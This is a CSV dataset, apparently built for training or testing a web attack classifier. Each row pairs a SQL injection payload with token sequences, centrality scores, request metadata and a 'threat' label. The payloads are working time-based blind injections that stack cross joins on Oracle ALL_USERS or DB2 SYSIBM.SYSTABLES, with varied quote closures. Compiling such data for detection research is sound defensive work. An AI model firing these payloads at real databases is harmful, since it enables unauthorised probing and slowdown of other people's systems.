payload,token,centrality,reqmethod,length,uagent,class,label
"rob.star@gmail.com"")) OR 1837=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) AND ((""dVTk""=""dVTk",STR DOT STAR ATR STR DOT STR DQUT RPRN RPRN OR INT EQ SELECT STR STAR FROM STR STR CMMA STR STR CMMA STR STR CMMA STR STR CMMA STR STR AND LPRN LPRN DQUT STR DQUT EQ DQUT STR,0.10256410256410256 0.1282051282051282 0.15384615384615385 0.1794871794871795 0.20512820512820512 0.20512820512820512 0.20512820512820512 0.20512820512820512 0.20512820512820512 0.20512820512820512 0.20512820512820512 0.20512820512820512 0.20512820512820512 0.20512820512820512 0.20512820512820512 0.20512820512820512 0.20512820512820512 0.20512820512820512 0.20512820512820512 0.20512820512820512 0.20512820512820512 0.20512820512820512 0.20512820512820512 0.20512820512820512 0.20512820512820512 0.20512820512820512 0.20512820512820512 0.20512820512820512 0.20512820512820512 0.20512820512820512 0.20512820512820512 0.20512820512820512 0.20512820512820512 0.20512820512820512 0.20512820512820512 0.20512820512820512 0.1794871794871795 0.15384615384615385 0.1282051282051282 0.10256410256410256,GET,136,"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3",threat,inference
"rob.star@gmail.com"" OR 1837=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) AND ""zYLB""=""zYLB",STR DOT STAR ATR STR DOT STR DQUT OR INT EQ SELECT STR STAR FROM STR STR CMMA STR STR CMMA STR STR CMMA STR STR CMMA STR STR AND DQUT STR DQUT EQ DQUT STR,0.11428571428571428 0.14285714285714285 0.17142857142857143 0.19999999999999998 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.19999999999999998 0.17142857142857143 0.14285714285714285 0.11428571428571428,GET,132,"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3",threat,inference
"rob.star@gmail.com"") OR 1837=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) AND (""Xnwp"" LIKE ""Xnwp",STR DOT STAR ATR STR DOT STR DQUT RPRN OR INT EQ SELECT STR STAR FROM STR STR CMMA STR STR CMMA STR STR CMMA STR STR CMMA STR STR AND LPRN DQUT STR DQUT LIKE DQUT STR,0.10810810810810811 0.13513513513513514 0.16216216216216217 0.1891891891891892 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.1891891891891892 0.16216216216216217 0.13513513513513514 0.10810810810810811,GET,139,"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3",threat,inference
"rob.star@gmail.com"" OR 1837=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) AND ""VsCg"" LIKE ""VsCg",STR DOT STAR ATR STR DOT STR DQUT OR INT EQ SELECT STR STAR FROM STR STR CMMA STR STR CMMA STR STR CMMA STR STR CMMA STR STR AND DQUT STR DQUT LIKE DQUT STR,0.11428571428571428 0.14285714285714285 0.17142857142857143 0.19999999999999998 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.19999999999999998 0.17142857142857143 0.14285714285714285 0.11428571428571428,GET,137,"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3",threat,inference
"rob.star@gmail.com%') OR 1837=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) AND ('%'='",STR DOT STAR ATR STR DOT STR PRCNT SQUT RPRN OR INT EQ SELECT STR STAR FROM STR STR CMMA STR STR CMMA STR STR CMMA STR STR CMMA STR STR AND LPRN SQUT PRCNT SQUT EQ SQUT,0.10810810810810811 0.13513513513513514 0.16216216216216217 0.1891891891891892 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.21621621621621623 0.1891891891891892 0.16216216216216217 0.13513513513513514 0.10810810810810811,GET,128,"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3",threat,inference
"rob.star@gmail.com%' OR 1837=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) AND '%'='",STR DOT STAR ATR STR DOT STR PRCNT SQUT OR INT EQ SELECT STR STAR FROM STR STR CMMA STR STR CMMA STR STR CMMA STR STR CMMA STR STR AND SQUT PRCNT SQUT EQ SQUT,0.11428571428571428 0.14285714285714285 0.17142857142857143 0.19999999999999998 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.19999999999999998 0.17142857142857143 0.14285714285714285 0.11428571428571428,GET,126,"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3",threat,inference
"rob.star@gmail.com%"" OR 1837=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) AND ""%""=""",STR DOT STAR ATR STR DOT STR PRCNT DQUT OR INT EQ SELECT STR STAR FROM STR STR CMMA STR STR CMMA STR STR CMMA STR STR CMMA STR STR AND DQUT PRCNT DQUT EQ DQUT,0.11428571428571428 0.14285714285714285 0.17142857142857143 0.19999999999999998 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.19999999999999998 0.17142857142857143 0.14285714285714285 0.11428571428571428,GET,126,"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3",threat,inference
"rob.star@gmail.com OR 1837=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5)-- MsHU",STR DOT STAR ATR STR DOT STR OR INT EQ SELECT STR STAR FROM STR STR CMMA STR STR CMMA STR STR CMMA STR STR CMMA STR STR DSCMT STR,0.13793103448275862 0.1724137931034483 0.20689655172413793 0.24137931034482757 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.24137931034482757 0.20689655172413793 0.1724137931034483 0.13793103448275862,GET,121,"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3",threat,inference
"rob.star@gmail.com) AND 1623=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3)-- LWgA",STR DOT STAR ATR STR DOT STR RPRN AND INT EQ SELECT STR STAR FROM STR DOT STR AS STR CMMA STR DOT STR AS STR CMMA STR DOT STR AS STR DSCMT STR,0.12121212121212122 0.15151515151515152 0.18181818181818182 0.21212121212121213 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.21212121212121213 0.18181818181818182 0.15151515151515152 0.12121212121212122,GET,127,"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3",threat,inference
"rob.star@gmail.com) AND 1623=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3) AND (4082=4082",STR DOT STAR ATR STR DOT STR RPRN AND INT EQ SELECT STR STAR FROM STR DOT STR AS STR CMMA STR DOT STR AS STR CMMA STR DOT STR AS STR AND LPRN INT EQ INT,0.1111111111111111 0.1388888888888889 0.16666666666666666 0.19444444444444442 0.2222222222222222 0.2222222222222222 0.2222222222222222 0.2222222222222222 0.2222222222222222 0.2222222222222222 0.2222222222222222 0.2222222222222222 0.2222222222222222 0.2222222222222222 0.2222222222222222 0.2222222222222222 0.2222222222222222 0.2222222222222222 0.2222222222222222 0.2222222222222222 0.2222222222222222 0.2222222222222222 0.2222222222222222 0.2222222222222222 0.2222222222222222 0.2222222222222222 0.2222222222222222 0.2222222222222222 0.2222222222222222 0.2222222222222222 0.2222222222222222 0.2222222222222222 0.2222222222222222 0.19444444444444442 0.16666666666666666 0.1388888888888889 0.1111111111111111,GET,135,"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3",threat,inference
"rob.star@gmail.com))) AND 1623=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3) AND (((5996=5996",STR DOT STAR ATR STR DOT STR RPRN RPRN RPRN AND INT EQ SELECT STR STAR FROM STR DOT STR AS STR CMMA STR DOT STR AS STR CMMA STR DOT STR AS STR AND LPRN LPRN LPRN INT EQ INT,0.1 0.125 0.15000000000000002 0.17500000000000002 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.17500000000000002 0.15000000000000002 0.125 0.1,GET,139,"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3",threat,inference
"rob.star@gmail.com')) AND 1623=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3) AND (('CqdR'='CqdR",STR DOT STAR ATR STR DOT STR SQUT RPRN RPRN AND INT EQ SELECT STR STAR FROM STR DOT STR AS STR CMMA STR DOT STR AS STR CMMA STR DOT STR AS STR AND LPRN LPRN SQUT STR SQUT EQ SQUT STR,0.09523809523809523 0.11904761904761904 0.14285714285714285 0.16666666666666666 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.16666666666666666 0.14285714285714285 0.11904761904761904 0.09523809523809523,GET,141,"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3",threat,inference
"rob.star@gmail.com'))) AND 1623=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3) AND ((('KHiY'='KHiY",STR DOT STAR ATR STR DOT STR SQUT RPRN RPRN RPRN AND INT EQ SELECT STR STAR FROM STR DOT STR AS STR CMMA STR DOT STR AS STR CMMA STR DOT STR AS STR AND LPRN LPRN LPRN SQUT STR SQUT EQ SQUT STR,0.09090909090909091 0.11363636363636365 0.13636363636363635 0.1590909090909091 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.1590909090909091 0.13636363636363635 0.11363636363636365 0.09090909090909091,GET,143,"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3",threat,inference
"rob.star@gmail.com' AND 1623=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3) AND 'ejZo'='ejZo",STR DOT STAR ATR STR DOT STR SQUT AND INT EQ SELECT STR STAR FROM STR DOT STR AS STR CMMA STR DOT STR AS STR CMMA STR DOT STR AS STR AND SQUT STR SQUT EQ SQUT STR,0.10526315789473684 0.13157894736842105 0.15789473684210525 0.18421052631578946 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.18421052631578946 0.15789473684210525 0.13157894736842105 0.10526315789473684,GET,137,"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3",threat,inference
"rob.star@gmail.com"") AND 1623=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3) AND (""XzPE""=""XzPE",STR DOT STAR ATR STR DOT STR DQUT RPRN AND INT EQ SELECT STR STAR FROM STR DOT STR AS STR CMMA STR DOT STR AS STR CMMA STR DOT STR AS STR AND LPRN DQUT STR DQUT EQ DQUT STR,0.1 0.125 0.15000000000000002 0.17500000000000002 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.17500000000000002 0.15000000000000002 0.125 0.1,GET,139,"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3",threat,inference
"rob.star@gmail.com"" AND 1623=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3) AND ""WJIg""=""WJIg",STR DOT STAR ATR STR DOT STR DQUT AND INT EQ SELECT STR STAR FROM STR DOT STR AS STR CMMA STR DOT STR AS STR CMMA STR DOT STR AS STR AND DQUT STR DQUT EQ DQUT STR,0.10526315789473684 0.13157894736842105 0.15789473684210525 0.18421052631578946 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.18421052631578946 0.15789473684210525 0.13157894736842105 0.10526315789473684,GET,137,"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3",threat,inference
"rob.star@gmail.com"" AND 1623=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3) AND ""ODer"" LIKE ""ODer",STR DOT STAR ATR STR DOT STR DQUT AND INT EQ SELECT STR STAR FROM STR DOT STR AS STR CMMA STR DOT STR AS STR CMMA STR DOT STR AS STR AND DQUT STR DQUT LIKE DQUT STR,0.10526315789473684 0.13157894736842105 0.15789473684210525 0.18421052631578946 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.18421052631578946 0.15789473684210525 0.13157894736842105 0.10526315789473684,GET,142,"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3",threat,inference
"rob.star@gmail.com%')) AND 1623=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3) AND (('%'='",STR DOT STAR ATR STR DOT STR PRCNT SQUT RPRN RPRN AND INT EQ SELECT STR STAR FROM STR DOT STR AS STR CMMA STR DOT STR AS STR CMMA STR DOT STR AS STR AND LPRN LPRN SQUT PRCNT SQUT EQ SQUT,0.09523809523809523 0.11904761904761904 0.14285714285714285 0.16666666666666666 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.16666666666666666 0.14285714285714285 0.11904761904761904 0.09523809523809523,GET,135,"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3",threat,inference
"rob.star@gmail.com%' AND 1623=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3) AND '%'='",STR DOT STAR ATR STR DOT STR PRCNT SQUT AND INT EQ SELECT STR STAR FROM STR DOT STR AS STR CMMA STR DOT STR AS STR CMMA STR DOT STR AS STR AND SQUT PRCNT SQUT EQ SQUT,0.10526315789473684 0.13157894736842105 0.15789473684210525 0.18421052631578946 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.18421052631578946 0.15789473684210525 0.13157894736842105 0.10526315789473684,GET,131,"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3",threat,inference
"rob.star@gmail.com%"" AND 1623=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3) AND ""%""=""",STR DOT STAR ATR STR DOT STR PRCNT DQUT AND INT EQ SELECT STR STAR FROM STR DOT STR AS STR CMMA STR DOT STR AS STR CMMA STR DOT STR AS STR AND DQUT PRCNT DQUT EQ DQUT,0.10526315789473684 0.13157894736842105 0.15789473684210525 0.18421052631578946 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.18421052631578946 0.15789473684210525 0.13157894736842105 0.10526315789473684,GET,131,"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3",threat,inference
"rob.star@gmail.com AND 1623=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3)# UUHh",STR DOT STAR ATR STR DOT STR AND INT EQ SELECT STR STAR FROM STR DOT STR AS STR CMMA STR DOT STR AS STR CMMA STR DOT STR AS STR HASH STR,0.125 0.15625 0.1875 0.21875 0.25 0.25 0.25 0.25 0.25 0.25 0.25 0.25 0.25 0.25 0.25 0.25 0.25 0.25 0.25 0.25 0.25 0.25 0.25 0.25 0.25 0.25 0.25 0.25 0.25 0.21875 0.1875 0.15625 0.125,GET,125,"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3",threat,inference
"rob.star@gmail.com) OR 6093=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3)-- RqZr",STR DOT STAR ATR STR DOT STR RPRN OR INT EQ SELECT STR STAR FROM STR DOT STR AS STR CMMA STR DOT STR AS STR CMMA STR DOT STR AS STR DSCMT STR,0.12121212121212122 0.15151515151515152 0.18181818181818182 0.21212121212121213 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.21212121212121213 0.18181818181818182 0.15151515151515152 0.12121212121212122,GET,126,"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3",threat,inference
